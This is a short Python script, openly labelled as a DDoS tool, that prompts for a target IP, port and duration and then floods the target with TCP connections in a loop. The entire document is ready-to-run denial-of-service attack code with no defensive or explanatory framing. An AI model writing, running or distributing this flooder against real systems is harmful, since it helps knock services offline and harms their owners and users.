import time
import socket

class DDoS():
    def attack(ip, port, seconds):
        try:
            packets = 0
            start = time.time()
            end = start + seconds
            while time.time() < end:
                try:
                    target = (ip, int(port))
                    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    client.connect(target)
                    packets+=1
                    print(f"[DDoS] Packet #{packets} send.")
                except:
                    print(f"[DDoS] Unable to send the #{packets} packet.")
            print(f"[DDoS] Done.\n")
            return screen()
        except:
            pass

def screen():
    while True:
        try:
            ip = str(input("[DDoS] IP: "))
            break
        except:
            False
    while True:
        try:
            port = int(input("[DDoS] Port: "))
            break
        except:
            False
    while True:
        try:
            duration = int(input(f"[DDoS] Seconds: "))
            break
        except:
            False

    DDoS.attack(ip, port, duration)

screen()